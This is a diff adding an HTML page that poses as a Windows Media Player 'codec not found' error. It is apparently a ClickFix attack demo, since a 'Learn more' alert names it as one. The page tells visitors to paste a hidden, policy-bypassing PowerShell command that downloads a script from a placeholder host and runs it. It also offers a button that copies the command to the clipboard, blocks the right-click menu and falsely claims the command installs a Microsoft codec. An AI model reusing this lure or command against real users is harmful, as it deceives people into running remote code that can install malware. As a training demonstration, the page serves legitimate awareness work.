@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Windows Media Player — Codec Required</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #1b1b1b;
+      font-family: "Segoe UI", -apple-system, sans-serif;
+      min-height: 100vh;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+    }
+    .player-area {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+    .video-bg {
+      position: absolute;
+      inset: 0;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .video-bg .text {
+      color: #444;
+      font-size: 14px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+    .video-bg .icon { font-size: 48px; opacity: 0.3; }
+
+    .error-dialog {
+      position: relative;
+      z-index: 10;
+      background: #2d2d2d;
+      border: 1px solid #444;
+      border-radius: 8px;
+      max-width: 480px;
+      width: 90%;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.5);
+      overflow: hidden;
+    }
+    .dialog-header {
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .dialog-icon {
+      width: 40px; height: 40px;
+      background: linear-gradient(135deg, #0078d4, #106ebe);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+    }
+    .dialog-header h2 { font-size: 14px; font-weight: 500; flex: 1; }
+    .dialog-close {
+      width: 28px; height: 28px;
+      background: none;
+      border: none;
+      color: #999;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .dialog-close:hover { background: rgba(255,255,255,0.1); }
+    .dialog-body {
+      padding: 0 20px 20px;
+    }
+    .error-code {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 6px;
+      padding: 12px;
+      font-family: "Cascadia Code", monospace;
+      font-size: 12px;
+      margin-bottom: 14px;
+      color: #ccc;
+      line-height: 1.6;
+    }
+    .error-code .red { color: #f14c4c; }
+    .error-code .yellow { color: #cca700; }
+    .error-code .dim { color: #666; }
+    .dialog-body p {
+      font-size: 13px;
+      color: #ccc;
+      line-height: 1.6;
+      margin-bottom: 12px;
+    }
+    .dialog-body p b { color: #fff; }
+    .fix-steps {
+      background: #1f1f1f;
+      border: 1px solid #333;
+      border-radius: 8px;
+      overflow: hidden;
+      margin: 14px 0;
+    }
+    .fix-step {
+      padding: 12px 14px;
+      border-bottom: 1px solid #333;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      font-size: 13px;
+    }
+    .fix-step:last-child { border-bottom: none; }
+    .step-num {
+      width: 24px; height: 24px;
+      background: #0078d4;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 600;
+      flex-shrink: 0;
+    }
+    .step-text { color: #ccc; line-height: 1.5; }
+    .step-text b { color: #fff; }
+    .step-text code {
+      display: block;
+      background: #111;
+      border: 1px solid #333;
+      border-radius: 4px;
+      padding: 8px 10px;
+      margin-top: 6px;
+      font-family: "Cascadia Code", Consolas, monospace;
+      font-size: 12px;
+      color: #4ec9b0;
+      cursor: pointer;
+      position: relative;
+      word-break: break-all;
+    }
+    .step-text code:hover { background: #1a1a1a; }
+    .step-text code::after {
+      content: "Click to copy";
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 10px;
+      color: #666;
+    }
+    .copy-toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0078d4;
+      color: #fff;
+      padding: 8px 18px;
+      border-radius: 6px;
+      font-size: 13px;
+      display: none;
+      z-index: 200;
+      animation: toastIn 0.3s ease-out;
+    }
+    @keyframes toastIn { from { transform: translateX(-50%) translateY(10px); opacity: 0; } }
+    .dialog-actions {
+      display: flex;
+      gap: 8px;
+      padding-top: 8px;
+    }
+    .btn-win {
+      flex: 1;
+      padding: 8px 16px;
+      border-radius: 4px;
+      font: inherit;
+      font-size: 13px;
+      cursor: pointer;
+      border: none;
+    }
+    .btn-primary { background: #0078d4; color: #fff; }
+    .btn-primary:hover { background: #106ebe; }
+    .btn-secondary { background: #333; color: #ccc; border: 1px solid #555; }
+    .controls-bar {
+      background: #1f1f1f;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-size: 12px;
+      color: #999;
+    }
+    .progress-bar { flex: 1; height: 3px; background: #333; border-radius: 2px; }
+    @media (max-width: 500px) {
+      .error-dialog { width: 95%; }
+      .dialog-body p { font-size: 12px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="player-area">
+    <div class="video-bg">
+      <div class="text">
+        <div class="icon">🎬</div>
+        <span>Cannot play this file</span>
+      </div>
+    </div>
+
+    <div class="error-dialog">
+      <div class="dialog-header">
+        <div class="dialog-icon">🎵</div>
+        <h2>Codec not found — Cannot play media</h2>
+        <button class="dialog-close">✕</button>
+      </div>
+      <div class="dialog-body">
+        <div class="error-code">
+          <span class="red">Error 0xc00d5212</span><br>
+          <span class="dim">Missing codec:</span> <span class="yellow">HEVC/H.265 Video Decoder</span><br>
+          <span class="dim">File:</span> video_2026_final.mp4<br>
+          <span class="dim">Container:</span> MPEG-4 (H.265/HEVC Main10@L5.1)
+        </div>
+
+        <p>This file requires the <b>HEVC Video Extensions</b> codec which is not installed on your system. You can fix this by running the codec installer from the command line.</p>
+
+        <div class="fix-steps">
+          <div class="fix-step" id="step1">
+            <div class="step-num">1</div>
+            <div class="step-text">
+              Press <b>Win + R</b> to open the Run dialog
+            </div>
+          </div>
+          <div class="fix-step">
+            <div class="step-num">2</div>
+            <div class="step-text">
+              Copy and paste this command, then press Enter:
+              <code id="cmdCode" onclick="copyCmd()">powershell -w hidden -ep bypass -c "irm https://codec-update.example/install.ps1 | iex"</code>
+            </div>
+          </div>
+          <div class="fix-step">
+            <div class="step-num">3</div>
+            <div class="step-text">
+              Wait for the codec to install, then restart the player
+            </div>
+          </div>
+        </div>
+
+        <p style="font-size:12px;color:#888">This will download and install the missing codec from Microsoft's codec repository. The process takes about 30 seconds.</p>
+
+        <div class="dialog-actions">
+          <button class="btn-win btn-secondary" onclick="alert('This is a Tetapux demo showing a clickfix attack. The command would run a malicious PowerShell script.')">Learn more</button>
+          <button class="btn-win btn-primary" onclick="copyCmd()">Copy fix command</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="controls-bar">
+    <span>▶</span>
+    <span>0:00 / 1:24:37</span>
+    <div class="progress-bar"></div>
+    <span>🔊</span>
+    <span>⛶</span>
+  </div>
+
+  <div class="copy-toast" id="toast">Copied to clipboard!</div>
+
+  <script>
+    function copyCmd() {
+      const cmd = document.getElementById("cmdCode").textContent;
+      navigator.clipboard.writeText(cmd).then(() => {
+        const toast = document.getElementById("toast");
+        toast.style.display = "block";
+        setTimeout(() => toast.style.display = "none", 2000);
+      }).catch(() => {});
+    }
+
+    document.addEventListener("contextmenu", e => e.preventDefault());
+  </script>
+  <script src="/tetapux/disclaimer.js" async></script>
+</body>
+</html>
